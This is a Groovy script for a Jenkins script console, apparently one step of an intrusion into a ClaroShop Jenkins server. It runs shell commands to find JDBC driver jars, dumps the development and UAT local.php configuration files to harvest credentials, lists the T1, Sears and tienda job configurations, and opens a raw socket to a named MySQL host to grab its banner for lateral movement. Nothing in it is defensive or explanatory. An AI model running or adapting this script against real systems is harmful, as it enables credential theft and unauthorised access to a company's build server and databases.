// MICRO-AO: Find JDBC drivers on system + read remaining cred files + T1 job config
def run = { cmd ->
    def p = ["bash", "-c", cmd].execute()
    def out = new StringBuffer()
    def err = new StringBuffer()
    p.consumeProcessOutput(out, err)
    p.waitForOrKill(20000)
    out.toString().take(4000)
}

println "=== FIND JDBC drivers on system ==="
def jdbc = run("find / -name '*.jar' 2>/dev/null | grep -i 'mysql\\|mariadb\\|jdbc\\|connector' | grep -v proc | head -20")
println "JDBC JARs: " + jdbc.take(1000)

println "\n=== Java libs in usr/share ==="
def javaLibs = run("ls /usr/share/java/ 2>/dev/null | head -30")
println javaLibs.take(500)

println "\n=== ClaroShop/Desarrollo/local.php ==="
def dev = run("cat '/var/jenkins_home/workspace/_trash/name_it/ClaroShop/Desarrollo/local.php' 2>/dev/null | head -80")
println dev.take(3000)

println "\n=== ClaroShop/UAT/local.php ==="
def uat = run("cat '/var/jenkins_home/workspace/_trash/name_it/ClaroShop/UAT/local.php' 2>/dev/null | head -60")
println uat.take(2000)

println "\n=== T1 jobs in Jenkins ==="
def t1jobs = run("ls /var/jenkins_home/jobs/ | grep -i 't1\\|sears\\|tienda'")
println t1jobs.take(500)

println "\n=== t1comercios job nested structure ==="
def t1struct = run("find /var/jenkins_home/jobs -maxdepth 5 -name 'config.xml' 2>/dev/null | xargs grep -l 't1\\|T1' 2>/dev/null | head -10")
println "T1 configs: " + t1struct.take(500)

println "\n=== TRY MySQL raw socket connection ==="
// Raw MySQL handshake via Groovy socket
try {
    def socket = new Socket()
    socket.connect(new InetSocketAddress("appdb.claroshop-services.net", 3306), 5000)
    def input = socket.getInputStream()
    def buf = new byte[100]
    socket.soTimeout = 3000
    def bytes = input.read(buf, 0, 100)
    def greeting = new String(buf, 0, bytes)
    println "MySQL server banner (first " + bytes + " bytes):"
    println "  Raw: " + greeting.replaceAll('[\\x00-\\x1f\\x7f-\\xff]', '.')
    println "  Version chars: " + (bytes > 10 ? greeting.substring(5).replaceAll('[\\x00-\\x08\\x0a-\\x1f]', '').take(30) : "N/A")
    socket.close()
} catch(e) {
    println "Socket fail: " + e.message?.take(100)
}

println "=== DONE MICRO-AO ==="
